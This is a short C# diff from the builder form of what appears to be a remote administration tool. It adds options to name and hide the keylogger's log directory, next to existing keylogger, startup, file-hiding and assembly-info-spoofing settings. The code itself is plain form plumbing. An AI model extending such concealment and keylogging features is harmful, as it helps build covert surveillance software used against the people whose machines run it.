@@ -77,6 +77,8 @@ namespace xServer.Forms
             profile.IconPath = txtIconPath.Text;
             profile.ChangeAsmInfo = chkChangeAsmInfo.Checked;
             profile.Keylogger = chkKeylogger.Checked;
+            profile.LogDirectoryName = txtLogDirectoryName.Text;
+            profile.HideLogDirectory = chkHideLogDirectory.Checked;
             profile.ProductName = txtProductName.Text;
             profile.Description = txtDescription.Text;
             profile.CompanyName = txtCompanyName.Text;
@@ -269,6 +271,8 @@ namespace xServer.Forms
             options.Startup = chkStartup.Checked;
             options.HideFile = chkHide.Checked;
             options.Keylogger = chkKeylogger.Checked;
+            options.LogDirectoryName = txtLogDirectoryName.Text;
+            options.HideLogDirectory = chkHideLogDirectory.Checked;
 
             if (options.Password.Length < 3)
             {
